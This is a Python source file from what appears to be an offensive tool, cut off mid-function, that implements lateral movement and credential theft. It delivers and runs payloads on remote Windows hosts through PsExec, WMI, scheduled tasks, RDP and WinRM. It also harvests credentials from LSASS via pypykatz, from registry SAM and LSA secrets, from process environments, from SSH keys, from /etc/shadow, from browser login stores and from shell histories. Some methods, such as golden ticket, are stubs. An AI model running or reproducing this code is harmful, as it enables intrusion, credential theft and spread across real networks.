                    'error': 'Username and password required for PowerShell remoting',
                    'target_ip': target_ip
                }

            self.logger.info(f"Attempting PowerShell remoting to {target_ip} as {domain}\\{username}")

            # Check WinRM availability
            winrm_check = self._check_winrm_availability(target_ip)
            if not winrm_check['available']:
                return {
                    'success': False,
                    'error': f'WinRM not available on {target_ip}: {winrm_check["reason"]}',
                    'target_ip': target_ip,
                    'winrm_check': winrm_check
                }

            # Build PowerShell command for remote execution
            ps_commands = []

            # Basic connection test
            ps_commands.append("Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory")

            # If payload is provided, prepare it for execution
            if payload_path and os.path.exists(payload_path):
                payload_commands = self._prepare_powershell_payload(payload_path)
                ps_commands.extend(payload_commands)

            # Attempt PowerShell remoting using different methods
            execution_methods = ['invoke-command', 'enter-pssession', 'winrs']
            execution_result = None
            successful_method = None

            for method in execution_methods:
                try:
                    self.logger.debug(f"Attempting PowerShell remoting using {method}")
                    execution_result = self._execute_powershell_remote(
                        target_ip, username, password, domain, ps_commands, method
                    )

                    if execution_result['success']:
                        successful_method = method
                        break

                except Exception as e:
                    self.logger.debug(f"PowerShell method {method} failed: {e}")
                    continue

            if execution_result and execution_result['success']:
                result = {
                    'success': True,
                    'target_ip': target_ip,
                    'method': 'powershell_remoting',
                    'execution_method': successful_method,
                    'credentials_used': {'username': username, 'domain': domain},
                    'execution_details': execution_result,
                    'commands_executed': len(ps_commands)
                }

                # Parse command outputs
                if 'output' in execution_result:
                    result['system_info'] = self._parse_powershell_output(execution_result['output'])

                return result
            else:
                return {
                    'success': False,
                    'error': 'All PowerShell remoting methods failed',
                    'target_ip': target_ip,
                    'attempted_methods': execution_methods,
                    'last_error': execution_result.get('error') if execution_result else 'No execution attempted'
                }

        except Exception as e:
            self.logger.error(f"PowerShell remoting failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'target_ip': target_ip,
                'method': 'powershell_remoting'
            }

    def _windows_pass_the_hash(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Pass-the-hash attack (stub)."""
        hash_value = credentials.get('nt_hash') or credentials.get('lm_hash', 'unknown')
        self.logger.debug(f"Pass-the-hash attack attempted to {target_ip} with hash for {credentials.get('username', 'unknown')} (hash: {hash_value[:8]}...)")
        if payload_path:
            self.logger.debug(f"PTH payload specified: {payload_path}")
        return {'success': False, 'error': 'Pass-the-hash not implemented', 'target_ip': target_ip}

    def _windows_pass_the_ticket(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Pass-the-ticket attack (stub)."""
        ticket = credentials.get('kerberos_ticket', 'unknown')
        self.logger.debug(f"Pass-the-ticket attack attempted to {target_ip} with ticket for {credentials.get('username', 'unknown')}")
        if payload_path:
            self.logger.debug(f"PTT payload specified: {payload_path}")
        return {'success': False, 'error': 'Pass-the-ticket not implemented', 'target_ip': target_ip, 'ticket_info': str(ticket)[:50]}

    def _windows_golden_ticket(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Golden ticket attack (stub)."""
        krbtgt_hash = credentials.get('krbtgt_hash', 'unknown')
        domain = credentials.get('domain', 'unknown')
        self.logger.debug(f"Golden ticket attack attempted to {target_ip} for domain {domain} with KRBTGT hash {krbtgt_hash[:8]}...")
        if payload_path:
            self.logger.debug(f"Golden ticket payload specified: {payload_path}")
        return {'success': False, 'error': 'Golden ticket not implemented', 'target_ip': target_ip, 'domain': domain, 'krbtgt_hash_prefix': krbtgt_hash[:8] if krbtgt_hash != 'unknown' else 'unknown'}

    def _linux_nfs_mount(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """NFS mount lateral movement (stub)."""
        mount_point = credentials.get('mount_point', '/mnt/nfs')
        self.logger.debug(f"NFS mount lateral movement attempted to {target_ip} at mount point {mount_point}")
        if payload_path:
            self.logger.debug(f"NFS payload specified: {payload_path}")
        return {'success': False, 'error': 'NFS mount not implemented', 'target_ip': target_ip}

    def _linux_docker_api(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Docker API lateral movement (stub)."""
        api_port = credentials.get('docker_port', '2376')
        self.logger.debug(f"Docker API lateral movement attempted to {target_ip}:{api_port}")
        if payload_path:
            self.logger.debug(f"Docker container payload specified: {payload_path}")
        return {'success': False, 'error': 'Docker API not implemented', 'target_ip': target_ip}

    def _linux_ansible(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Ansible lateral movement (stub)."""
        self.logger.debug(f"Ansible lateral movement attempted to {target_ip} with user {credentials.get('username', 'unknown')}")
        if payload_path:
            self.logger.debug(f"Ansible playbook specified: {payload_path}")
        return {'success': False, 'error': 'Ansible not implemented', 'target_ip': target_ip}

    def _linux_salt_stack(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Salt Stack lateral movement (stub)."""
        salt_master = credentials.get('salt_master', target_ip)
        self.logger.debug(f"Salt Stack lateral movement attempted to {target_ip} via master {salt_master}")
        if payload_path:
            self.logger.debug(f"Salt state file specified: {payload_path}")
        return {'success': False, 'error': 'Salt Stack not implemented', 'target_ip': target_ip}

    def _linux_puppet(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Puppet lateral movement (stub)."""
        puppet_master = credentials.get('puppet_master', target_ip)
        self.logger.debug(f"Puppet lateral movement attempted to {target_ip} via master {puppet_master}")
        if payload_path:
            self.logger.debug(f"Puppet manifest specified: {payload_path}")
        return {'success': False, 'error': 'Puppet not implemented', 'target_ip': target_ip}

    def _linux_chef(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Chef lateral movement (stub)."""
        chef_server = credentials.get('chef_server', target_ip)
        self.logger.debug(f"Chef lateral movement attempted to {target_ip} via server {chef_server}")
        if payload_path:
            self.logger.debug(f"Chef cookbook specified: {payload_path}")
        return {'success': False, 'error': 'Chef not implemented', 'target_ip': target_ip}

    def _linux_kubernetes(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Kubernetes lateral movement (stub)."""
        namespace = credentials.get('namespace', 'default')
        cluster_endpoint = credentials.get('cluster_endpoint', f"https://{target_ip}:6443")
        self.logger.debug(f"Kubernetes lateral movement attempted to cluster {cluster_endpoint} in namespace {namespace}")
        if payload_path:
            self.logger.debug(f"Kubernetes manifest specified: {payload_path}")
        return {'success': False, 'error': 'Kubernetes not implemented', 'target_ip': target_ip}

    def _linux_ssh_agent_hijacking(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """SSH agent hijacking (stub)."""
        agent_socket = credentials.get('ssh_auth_sock', '/tmp/ssh-agent.sock')
        self.logger.debug(f"SSH agent hijacking attempted on {target_ip} targeting socket {agent_socket}")
        if payload_path:
            self.logger.debug(f"SSH agent hijack payload specified: {payload_path}")
        return {'success': False, 'error': 'SSH agent hijacking not implemented', 'target_ip': target_ip}

    def _linux_sudo_hijacking(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Sudo hijacking (stub)."""
        target_user = credentials.get('target_user', 'root')
        self.logger.debug(f"Sudo hijacking attempted on {target_ip} targeting user {target_user}")
        if payload_path:
            self.logger.debug(f"Sudo hijack payload specified: {payload_path}")
        return {'success': False, 'error': 'Sudo hijacking not implemented', 'target_ip': target_ip}

    def _linux_cron_hijacking(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Cron hijacking (stub)."""
        cron_user = credentials.get('cron_user', 'root')
        self.logger.debug(f"Cron hijacking attempted on {target_ip} targeting {cron_user}'s crontab")
        if payload_path:
            self.logger.debug(f"Cron job payload specified: {payload_path}")
        return {'success': False, 'error': 'Cron hijacking not implemented', 'target_ip': target_ip}

    # Command execution methods

    def _execute_ssh_command(self, session_info: Dict[str, Any], command: str, timeout: int) -> Dict[str, Any]:
        """Execute command via SSH."""
        try:
            credentials = session_info['credentials']
            target_ip = session_info['target_ip']
            username = credentials['username']

            if 'password' in credentials:
                cmd = f'sshpass -p "{credentials["password"]}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'
            else:
                private_key = credentials['private_key_path']
                cmd = f'ssh -i {private_key} -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'

            process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)

            return {
                'success': process.returncode == 0,
                'output': process.stdout,
                'error': process.stderr,
                'exit_code': process.returncode
            }

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': f'Command timed out after {timeout} seconds',
                'exit_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'exit_code': -1
            }

    def _execute_winrm_command(self, session_info: Dict[str, Any], command: str, timeout: int) -> Dict[str, Any]:
        """Execute command via WinRM."""
        try:
            credentials = session_info['credentials']
            target_ip = session_info['target_ip']
            username = credentials['username']
            password = credentials['password']

            cmd = f'winrs -r:{target_ip} -u:{username} -p:{password} "{command}"'
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)

            return {
                'success': process.returncode == 0,
                'output': process.stdout,
                'error': process.stderr,
                'exit_code': process.returncode
            }

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': f'Command timed out after {timeout} seconds',
                'exit_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'exit_code': -1
            }

    def _execute_psexec_command(self, session_info: Dict[str, Any], command: str, timeout: int) -> Dict[str, Any]:
        """Execute command via PsExec."""
        try:
            credentials = session_info['credentials']
            target_ip = session_info['target_ip']
            username = credentials['username']
            password = credentials['password']
            domain = credentials.get('domain', '.')

            cmd = f'psexec \\\\{target_ip} -u {domain}\\{username} -p {password} {command}'
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)

            return {
                'success': process.returncode == 0,
                'output': process.stdout,
                'error': process.stderr,
                'exit_code': process.returncode
            }

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': f'Command timed out after {timeout} seconds',
                'exit_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'exit_code': -1
            }

    def _execute_generic_command(self, _session_info: Dict[str, Any], _command: str, _timeout: int) -> Dict[str, Any]:
        """Execute command using generic method."""
        return {
            'success': False,
            'output': '',
            'error': 'Generic command execution not implemented',
            'exit_code': -1
        }

    def _execute_rdp_payload(self, target_ip: str, username: str, password: str,
                           domain: str, payload_path: str, method: str) -> Dict[str, Any]:
        """Execute payload via RDP connection."""
        try:
            import shutil
            import tempfile
            from datetime import datetime

            self.logger.info(f"Executing RDP payload on {target_ip}")

            # Use xfreerdp or rdesktop for actual RDP connection
            rdp_command = []

            if shutil.which('xfreerdp'):
                # Use xfreerdp
                rdp_command = [
                    'xfreerdp',
                    f'/u:{username}',
                    f'/p:{password}',
                    f'/v:{target_ip}',
                    '/cert-ignore',
                    '/compression',
                    '+clipboard'
                ]
                if domain:
                    rdp_command.append(f'/d:{domain}')
            elif shutil.which('rdesktop'):
                # Use rdesktop as fallback
                rdp_command = [
                    'rdesktop',
                    '-u', username,
                    '-p', password,
                    target_ip
                ]
            else:
                raise Exception("No RDP client found (xfreerdp or rdesktop required)")

            # Create script to execute payload
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as script_file:
                script_file.write(f'''@echo off
echo Transferring payload...
copy "{payload_path}" "C:\\temp\\payload.exe"
echo Executing payload...
"C:\\temp\\payload.exe"
echo Payload execution completed.
pause
''')
                script_path = script_file.name

            try:
                # Execute RDP connection with script
                start_time = datetime.now()
                result = subprocess.run(
                    rdp_command + [f'/app:"{script_path}"'],
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minute timeout
                )
                end_time = datetime.now()
                execution_time = (end_time - start_time).total_seconds()

                success = result.returncode == 0

                return {
                    'success': success,
                    'method': 'rdp_payload_execution',
                    'target_ip': target_ip,
                    'payload_path': payload_path,
                    'execution_time': execution_time,
                    'output': result.stdout,
                    'error': result.stderr if not success else '',
                    'return_code': result.returncode,
                    'details': {
                        'rdp_method': method,
                        'username': username,
                        'domain': domain,
                        'rdp_client': 'xfreerdp' if 'xfreerdp' in rdp_command[0] else 'rdesktop'
                    }
                }
            finally:
                # Clean up script file
                if os.path.exists(script_path):
                    os.unlink(script_path)

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'RDP connection timeout',
                'method': 'rdp_payload_execution'
            }
        except Exception as e:
            self.logger.error(f"RDP payload execution failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'method': 'rdp_payload_execution'
            }

    def _execute_smb_payload(self, target_ip: str, auth_data: Dict[str, Any],
                           payload_path: str, connection_result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute payload via SMB connection."""
        try:
            import shutil
            import tempfile
            from datetime import datetime

            self.logger.info(f"Executing SMB payload on {target_ip}")
            self.logger.debug(f"Using connection result: {connection_result.get('method', 'unknown')} method")

            username = auth_data.get('username', '')
            password = auth_data.get('password', '')
            domain = auth_data.get('domain', '')

            start_time = datetime.now()

            # Method 1: Try PsExec
            if shutil.which('psexec.py') or shutil.which('psexec'):
                try:
                    # Use Impacket's psexec.py or Sysinternals PsExec
                    psexec_cmd = []
                    if shutil.which('psexec.py'):
                        psexec_cmd = ['psexec.py']
                        if domain:
                            psexec_cmd.extend([f'{domain}/{username}:{password}@{target_ip}'])
                        else:
                            psexec_cmd.extend([f'{username}:{password}@{target_ip}'])
                    else:
                        psexec_cmd = ['psexec', f'\\\\{target_ip}']
                        if username:
                            psexec_cmd.extend(['-u', username])
                        if password:
                            psexec_cmd.extend(['-p', password])

                    # Copy payload to target
                    remote_path = f'C:\\temp\\payload_{int(time.time())}.exe'
                    psexec_cmd.extend(['-c', payload_path, remote_path])

                    result = subprocess.run(
                        psexec_cmd,
                        capture_output=True,
                        text=True,
                        timeout=120
                    )

                    if result.returncode == 0:
                        end_time = datetime.now()
                        return {
                            'success': True,
                            'method': 'smb_psexec_execution',
                            'target_ip': target_ip,
                            'payload_path': payload_path,
                            'execution_time': (end_time - start_time).total_seconds(),
                            'output': result.stdout,
                            'return_code': result.returncode,
                            'details': {
                                'execution_method': 'psexec',
                                'remote_path': remote_path,
                                'username': username,
                                'domain': domain
                            }
                        }
                except subprocess.TimeoutExpired:
                    self.logger.warning("PsExec timeout, trying alternative method")
                except Exception as e:
                    self.logger.warning(f"PsExec failed: {e}, trying alternative method")

            # Method 2: Try WMI execution
            if shutil.which('wmiexec.py'):
                try:
                    # First copy file via SMB
                    smbclient_cmd = ['smbclient', f'//{target_ip}/C$']
                    if username:
                        smbclient_cmd.extend(['-U', f'{username}%{password}'])

                    # Create upload script
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.smbscript', delete=False) as script_file:
                        payload_basename = os.path.basename(payload_path)
                        script_file.write(f'put "{payload_path}" "temp\\{payload_basename}"\n')
                        script_file.write('exit\n')
                        script_path = script_file.name

                    try:
                        # Upload file
                        upload_result = subprocess.run(
                            smbclient_cmd + ['-f', script_path],
                            capture_output=True,
                            text=True,
                            timeout=60
                        )

                        if upload_result.returncode == 0:
                            # Execute via WMI
                            wmi_cmd = ['wmiexec.py']
                            if domain:
                                wmi_cmd.extend([f'{domain}/{username}:{password}@{target_ip}'])
                            else:
                                wmi_cmd.extend([f'{username}:{password}@{target_ip}'])

                            wmi_cmd.append(f'C:\\temp\\{payload_basename}')

                            wmi_result = subprocess.run(
                                wmi_cmd,
                                capture_output=True,
                                text=True,
                                timeout=120
                            )

                            end_time = datetime.now()
                            success = wmi_result.returncode == 0

                            return {
                                'success': success,
                                'method': 'smb_wmi_execution',
                                'target_ip': target_ip,
                                'payload_path': payload_path,
                                'execution_time': (end_time - start_time).total_seconds(),
                                'output': wmi_result.stdout,
                                'error': wmi_result.stderr if not success else '',
                                'return_code': wmi_result.returncode,
                                'details': {
                                    'execution_method': 'wmi',
                                    'upload_success': True,
                                    'remote_path': f'C:\\temp\\{payload_basename}',
                                    'username': username,
                                    'domain': domain
                                }
                            }
                    finally:
                        # Clean up script file
                        if os.path.exists(script_path):
                            os.unlink(script_path)

                except Exception as e:
                    self.logger.warning(f"WMI execution failed: {e}")

            # Method 3: Try scheduled task creation
            if shutil.which('schtasks'):
                try:
                    task_name = f"IntellicrackTask_{int(time.time())}"

                    # Create scheduled task
                    schtasks_cmd = [
                        'schtasks', '/create',
                        '/s', target_ip,
                        '/tn', task_name,
                        '/tr', payload_path,
                        '/sc', 'once',
                        '/st', '00:00',
                        '/f'  # Force overwrite
                    ]

                    if username:
                        schtasks_cmd.extend(['/u', username])
                    if password:
                        schtasks_cmd.extend(['/p', password])

                    create_result = subprocess.run(
                        schtasks_cmd,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )

                    if create_result.returncode == 0:
                        # Run the task immediately
                        run_cmd = [
                            'schtasks', '/run',
                            '/s', target_ip,
                            '/tn', task_name
                        ]

                        if username:
                            run_cmd.extend(['/u', username])
                        if password:
                            run_cmd.extend(['/p', password])

                        run_result = subprocess.run(
                            run_cmd,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )

                        # Clean up task
                        delete_cmd = [
                            'schtasks', '/delete',
                            '/s', target_ip,
                            '/tn', task_name,
                            '/f'
                        ]

                        if username:
                            delete_cmd.extend(['/u', username])
                        if password:
                            delete_cmd.extend(['/p', password])

                        subprocess.run(delete_cmd, capture_output=True, timeout=15)

                        end_time = datetime.now()
                        success = run_result.returncode == 0

                        return {
                            'success': success,
                            'method': 'smb_schtask_execution',
                            'target_ip': target_ip,
                            'payload_path': payload_path,
                            'execution_time': (end_time - start_time).total_seconds(),
                            'output': run_result.stdout,
                            'error': run_result.stderr if not success else '',
                            'return_code': run_result.returncode,
                            'details': {
                                'execution_method': 'scheduled_task',
                                'task_name': task_name,
                                'username': username,
                                'domain': domain
                            }
                        }

                except Exception as e:
                    self.logger.warning(f"Scheduled task execution failed: {e}")

            # All methods failed
            return {
                'success': False,
                'error': 'All SMB execution methods failed (psexec, wmi, schtasks not available or failed)',
                'method': 'smb_execution_failed',
                'target_ip': target_ip,
                'attempted_methods': ['psexec', 'wmi', 'schtasks']
            }

        except Exception as e:
            self.logger.error(f"SMB payload execution failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'method': 'smb_payload_execution'
            }

    # Credential harvesting methods

    def _harvest_memory_credentials(self, session_info: Dict[str, Any]) -> Dict[str, Any]:
        """Harvest credentials from memory using various techniques."""
        credentials = {'memory_credentials': []}

        try:
            target_host = session_info.get('target_host', '')
            os_type = session_info.get('os_type', 'unknown')

            if os_type.lower() == 'windows':
                # Windows memory credential harvesting

                # Method 1: Try pypykatz (Python Mimikatz)
                try:
                    from pypykatz import pypykatz

                    # Try to harvest from local LSASS dump or live process
                    try:
                        # Live process harvesting (requires admin privileges)
                        mimi = pypykatz.go_live()
                        if mimi:
                            for cred_type, creds in mimi.credentials.items():
                                for cred in creds:
                                    credentials['memory_credentials'].append({
                                        'type': cred_type,
                                        'username': getattr(cred, 'username', ''),
                                        'domain': getattr(cred, 'domainname', ''),
                                        'password': getattr(cred, 'password', ''),
                                        'hash': getattr(cred, 'nt_hash', '') or getattr(cred, 'lm_hash', ''),
                                        'source': 'pypykatz_live',
                                        'target': target_host
                                    })
                    except Exception as live_error:
                        self.logger.debug(f"Live pypykatz failed: {live_error}")

                except ImportError:
                    # pypykatz not available, try alternative methods

                    # Method 2: PowerShell-based credential extraction
                    try:
                        # Try Invoke-Mimikatz PowerShell script
                        ps_script = '''
                        function Invoke-MemoryCredHarvest {
                            try {
                                # Try to access LSASS process
                                $lsass = Get-Process lsass -ErrorAction SilentlyContinue
                                if ($lsass) {
                                    Write-Output "LSASS Process Found: $($lsass.Id)"
                                }

                                # Check for cached credentials in registry
                                $cachedCreds = @()
                                try {
                                    $regPath = "HKLM:\\SECURITY\\Cache"
                                    if (Test-Path $regPath) {
                                        $cachedCreds += "Registry cached credentials accessible"
                                    }
                                } catch {}

                                # Check for stored credentials
                                try {
                                    $storedCreds = cmdkey /list 2>$null
                                    if ($storedCreds) {
                                        $cachedCreds += $storedCreds
                                    }
                                } catch {}

                                return $cachedCreds
                            }
                            catch {
                                return "Error: $($_.Exception.Message)"
                            }
                        }
                        Invoke-MemoryCredHarvest
                        '''

                        result = subprocess.run([
                            'powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script
                        ], capture_output=True, text=True, timeout=30)

                        if result.returncode == 0 and result.stdout:
                            credentials['memory_credentials'].append({
                                'type': 'powershell_harvest',
                                'data': result.stdout.strip(),
                                'source': 'powershell',
                                'target': target_host
                            })

                    except Exception as ps_error:
                        self.logger.debug(f"PowerShell credential harvest failed: {ps_error}")

                    # Method 3: Windows API-based credential enumeration
                    try:
                        import ctypes

                        # Try to enumerate logon sessions
                        secur32 = ctypes.WinDLL('secur32.dll')

                        # Attempt to enumerate security packages
                        package_count = ctypes.c_ulong()
                        package_info = ctypes.c_void_p()

                        result = secur32.EnumerateSecurityPackagesW(
                            ctypes.byref(package_count),
                            ctypes.byref(package_info)
                        )

                        if result == 0:  # SEC_E_OK
                            credentials['memory_credentials'].append({
                                'type': 'security_packages',
                                'package_count': package_count.value,
                                'source': 'winapi',
                                'target': target_host
                            })

                            # Free the buffer
                            secur32.FreeContextBuffer(package_info)

                    except Exception as winapi_error:
                        self.logger.debug(f"WinAPI credential enumeration failed: {winapi_error}")

            elif os_type.lower() == 'linux':
                # Linux memory credential harvesting

                # Method 1: Process memory scanning
                try:

                    # Scan /proc/*/environ for credentials
                    proc_creds = []
                    try:
                        for pid_dir in os.listdir('/proc'):
                            if pid_dir.isdigit():
                                environ_file = f'/proc/{pid_dir}/environ'
                                if os.path.exists(environ_file):
                                    try:
                                        with open(environ_file, 'rb') as f:
                                            environ_data = f.read().decode('utf-8', errors='ignore')

                                        # Look for credential patterns
                                        cred_patterns = [
                                            r'PASSWORD=([^\x00]+)',
                                            r'TOKEN=([^\x00]+)',
                                            r'SECRET=([^\x00]+)',
                                            r'API_KEY=([^\x00]+)'
                                        ]

                                        for pattern in cred_patterns:
                                            matches = re.findall(pattern, environ_data, re.IGNORECASE)
                                            for match in matches:
                                                proc_creds.append({
                                                    'pid': pid_dir,
                                                    'credential': match,
                                                    'pattern': pattern
                                                })
                                    except PermissionError:
                                        continue
                                    except Exception:
                                        continue

                    except Exception as proc_error:
                        self.logger.debug(f"Process environment scan failed: {proc_error}")

                    if proc_creds:
                        credentials['memory_credentials'].append({
                            'type': 'process_environment',
                            'credentials': proc_creds,
                            'source': 'proc_environ',
                            'target': target_host
                        })

                except Exception as linux_error:
                    self.logger.debug(f"Linux memory harvest failed: {linux_error}")

                # Method 2: Memory dump analysis (if available)
                try:
                    # Check for memory dumps or core files
                    memory_sources = [
                        '/tmp/core.*',
                        '/var/crash/*',
                        '/tmp/*.dmp'
                    ]

                    import glob
                    found_dumps = []
                    for pattern in memory_sources:
                        found_dumps.extend(glob.glob(pattern))

                    if found_dumps:
                        credentials['memory_credentials'].append({
                            'type': 'memory_dumps',
                            'dumps': found_dumps[:10],  # Limit to first 10
                            'source': 'filesystem',
                            'target': target_host
                        })

                except Exception as dump_error:
                    self.logger.debug(f"Memory dump search failed: {dump_error}")

        except Exception as e:
            self.logger.error(f"Memory credential harvesting failed: {e}")

        return credentials

    def _harvest_registry_credentials(self, session_info: Dict[str, Any]) -> Dict[str, Any]:
        """Harvest credentials from registry including cached credentials and LSA secrets."""
        credentials = {'registry_credentials': []}

        try:
            target_host = session_info.get('target_host', '')
            os_type = session_info.get('os_type', 'unknown')

            if os_type.lower() == 'windows':
                try:
                    import winreg

                    # Registry paths containing credentials
                    registry_paths = [
                        (winreg.HKEY_LOCAL_MACHINE, r'SECURITY\Cache'),
                        (winreg.HKEY_LOCAL_MACHINE, r'SECURITY\Policy\Secrets'),
                        (winreg.HKEY_LOCAL_MACHINE, r'SAM\Domains\Account'),
                        (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Protected Storage System Provider'),
                        (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'),
                        (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Terminal Server Client\Default'),
                        (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Internet Settings'),
                        (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Control\LSA')
                    ]

                    for hive, path in registry_paths:
                        try:
                            with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as key:
                                try:
                                    # Enumerate values
                                    i = 0
                                    registry_data = {}
                                    while True:
                                        try:
                                            value_name, value_data, value_type = winreg.EnumValue(key, i)
                                            # Filter for credential-related values
                                            if any(keyword in value_name.lower() for keyword in
                                                  ['password', 'user', 'login', 'cred', 'secret', 'token']):
                                                registry_data[value_name] = {
                                                    'data': str(value_data) if len(str(value_data)) < 1000 else str(value_data)[:1000],
                                                    'type': value_type
                                                }
                                            i += 1
                                        except OSError:
                                            break

                                    if registry_data:
                                        credentials['registry_credentials'].append({
                                            'registry_path': path,
                                            'hive': 'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU',
                                            'data': registry_data,
                                            'source': 'windows_registry',
                                            'target': target_host
                                        })

                                except PermissionError:
                                    continue

                        except FileNotFoundError:
                            continue
                        except PermissionError:
                            continue

                except ImportError:
                    self.logger.debug("winreg not available for registry harvesting")

        except Exception as e:
            self.logger.error(f"Registry credential harvesting failed: {e}")

        return credentials

    def _harvest_file_credentials(self, session_info: Dict[str, Any]) -> Dict[str, Any]:
        """Harvest credentials from configuration files and SSH keys."""
        credentials = {'file_credentials': []}

        try:
            target_host = session_info.get('target_host', '')
            os_type = session_info.get('os_type', 'unknown')

            # Common credential file locations by OS
            if os_type.lower() == 'windows':
                file_locations = [
                    r'C:\Users\*\.ssh\*',
                    r'C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml',
                    r'C:\Users\*\AppData\Roaming\Microsoft\Credentials\*',
                    r'C:\ProgramData\Microsoft\Credentials\*',
                    r'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data',
                    r'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json',
                    r'C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*'
                ]
            else:  # Linux/Unix
                file_locations = [
                    '/home/*/.ssh/*',
                    '/root/.ssh/*',
                    '/home/*/.aws/credentials',
                    '/home/*/.config/gcloud/*',
                    '/home/*/.docker/config.json',
                    '/etc/shadow',
                    '/etc/passwd',
                    '/etc/ssh/ssh_host_*_key',
                    '/var/log/auth.log',
                    '/home/*/.bash_history',
                    '/home/*/.mysql_history',
                    '/home/*/.psql_history'
                ]

            import glob

            for pattern in file_locations:
                try:
                    matching_files = glob.glob(pattern)
                    for file_path in matching_files[:20]:  # Limit to 20 files per pattern
                        if os.path.isfile(file_path):
                            try:
                                file_size = os.path.getsize(file_path)
                                if file_size > 10 * 1024 * 1024:  # Skip files larger than 10MB
                                    continue

                                # Determine file type and extraction method
                                if file_path.endswith(('.key', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519')):
                                    # SSH private key
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        key_content = f.read(2048)  # Read first 2KB

                                    credentials['file_credentials'].append({
                                        'type': 'ssh_private_key',
                                        'file_path': file_path,
                                        'content_preview': key_content[:500],
                                        'is_encrypted': 'ENCRYPTED' in key_content,
                                        'source': 'ssh_key_file',
                                        'target': target_host
                                    })

                                elif file_path.endswith(('.json', '.xml', '.conf', '.config', '.ini')):
                                    # Configuration file
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        config_content = f.read(5120)  # Read first 5KB

                                    # Look for credential patterns
                                    cred_patterns = [
                                        r'password["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'username["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'api[_-]?key["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'secret["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'token["\s]*[:=]["\s]*([^"\s\n\r]+)'
                                    ]

                                    found_credentials = []
                                    for pattern in cred_patterns:
                                        matches = re.findall(pattern, config_content, re.IGNORECASE)
                                        for match in matches:
                                            found_credentials.append({
                                                'pattern': pattern,
                                                'value': match[:100]  # Limit value length
                                            })

                                    if found_credentials:
                                        credentials['file_credentials'].append({
                                            'type': 'config_file_credentials',
                                            'file_path': file_path,
                                            'credentials': found_credentials,
                                            'source': 'config_file',
                                            'target': target_host
                                        })

                                elif 'history' in file_path:
                                    # History file
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        history_lines = f.readlines()

                                    # Look for commands with passwords
                                    credential_commands = []
                                    for line in history_lines[-1000:]:  # Check last 1000 commands
                                        if any(keyword in line.lower() for keyword in
                                              ['password', 'passwd', 'mysql', 'psql', 'ssh', 'scp', 'ftp']):
                                            credential_commands.append(line.strip())

                                    if credential_commands:
                                        credentials['file_credentials'].append({
                                            'type': 'history_file_credentials',
                                            'file_path': file_path,
                                            'commands': credential_commands[:50],  # Limit to 50 commands
                                            'source': 'history_file',
                                            'target': target_host
                                        })

                            except (PermissionError, UnicodeDecodeError, OSError):
                                continue

                except Exception as pattern_error:
                    self.logger.debug(f"Pattern {pattern} failed: {pattern_error}")
                    continue

        except Exception as e:
